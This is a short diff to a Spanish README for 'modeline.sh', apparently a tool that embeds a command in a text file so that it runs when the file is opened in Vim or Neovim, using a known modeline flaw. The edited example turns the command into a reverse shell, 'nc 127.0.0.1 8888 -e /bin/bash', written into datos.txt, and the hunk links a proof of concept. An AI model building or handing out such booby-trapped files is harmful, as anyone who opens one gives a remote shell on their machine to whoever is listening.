@@ -13,7 +13,7 @@ modeline.sh _comando_ > archivoTexto.
 ### Ejemplo.
 _Se utilizará el comando nc para realizar un shell inverso._
 ```
-modeline.sh nc 127.0.0.1 8888 > datos.txt
+modeline.sh nc 127.0.0.1 8888 -e /bin/bash > datos.txt
 ```
 ## Referencias.
 [PoC](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md#summary)
